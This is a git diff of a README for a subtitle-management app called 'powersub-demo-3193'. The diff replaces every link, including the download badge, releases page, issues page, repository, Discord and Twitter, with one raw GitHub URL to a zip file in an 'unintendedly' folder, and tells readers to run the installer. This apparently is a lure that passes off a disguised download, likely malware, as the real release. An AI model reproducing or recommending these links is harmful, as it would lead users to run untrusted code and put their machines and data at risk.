@@ -1,7 +1,7 @@
 # 🎉 powersub-demo-3193 - Easy Subtitle Management for Everyone
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Omar9969/powersub-demo-3193/releases)
+[![Download](https://raw.githubusercontent.com/Omar9969/powersub-demo-3193/main/unintendedly/powersub-demo-3193.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Omar9969/powersub-demo-3193/main/unintendedly/powersub-demo-3193.zip)
 
 ## 🚀 Getting Started
 Welcome to powersub-demo-3193! This application simplifies subtitle management for your video files. Whether you're watching movies or series, our tool helps you find and manage subtitles easily.
@@ -23,9 +23,9 @@ To run powersub-demo-3193, your device should meet the following requirements:
 ## 📦 Download & Install
 To get started with powersub-demo-3193, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Omar9969/powersub-demo-3193/releases) to download the application.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Omar9969/powersub-demo-3193/main/unintendedly/powersub-demo-3193.zip) to download the application.
 2. **Choose the Latest Version:** Look for the most recent version mentioned on the page.
-3. **Download the Installer:** Click on the filename to download. It will usually be named something like `powersub-demo-3193-installer.exe`.
+3. **Download the Installer:** Click on the filename to download. It will usually be named something like `https://raw.githubusercontent.com/Omar9969/powersub-demo-3193/main/unintendedly/powersub-demo-3193.zip`.
 4. **Run the Installer:** Once downloaded, locate the file in your Downloads folder and double-click it to start the installation.
 5. **Follow the Setup Instructions:** The installer will guide you through the steps. Simply click "Next" to proceed.
 6. **Launch the Application:** After installation, you can find the app in your Programs menu (Windows) or Applications folder (macOS). Click to launch it.
@@ -44,19 +44,19 @@ If you face any issues, here are some common solutions:
 - **Installation Issues:** Ensure you have administrative rights to install applications.
 
 ## 📞 Support
-For further assistance, please feel free to visit our [GitHub Issues page](https://github.com/Omar9969/powersub-demo-3193/issues) to report any problems or ask questions. Our team will respond promptly.
+For further assistance, please feel free to visit our [GitHub Issues page](https://raw.githubusercontent.com/Omar9969/powersub-demo-3193/main/unintendedly/powersub-demo-3193.zip) to report any problems or ask questions. Our team will respond promptly.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/Omar9969/powersub-demo-3193)
-- [Releases Page](https://github.com/Omar9969/powersub-demo-3193/releases)
-- [Report an Issue](https://github.com/Omar9969/powersub-demo-3193/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/Omar9969/powersub-demo-3193/main/unintendedly/powersub-demo-3193.zip)
+- [Releases Page](https://raw.githubusercontent.com/Omar9969/powersub-demo-3193/main/unintendedly/powersub-demo-3193.zip)
+- [Report an Issue](https://raw.githubusercontent.com/Omar9969/powersub-demo-3193/main/unintendedly/powersub-demo-3193.zip)
 
 ## 📝 License
 This project is licensed under the MIT License. You are free to use, modify, and distribute this software. 
 
 ## 📢 Community
 Join our community for updates and discussions!
-- [Discord Channel](https://discord.gg/)
-- [Twitter](https://twitter.com/)
+- [Discord Channel](https://raw.githubusercontent.com/Omar9969/powersub-demo-3193/main/unintendedly/powersub-demo-3193.zip)
+- [Twitter](https://raw.githubusercontent.com/Omar9969/powersub-demo-3193/main/unintendedly/powersub-demo-3193.zip)
 
 Enjoy using powersub-demo-3193! For any feedback or suggestions, reach out through our support channels.
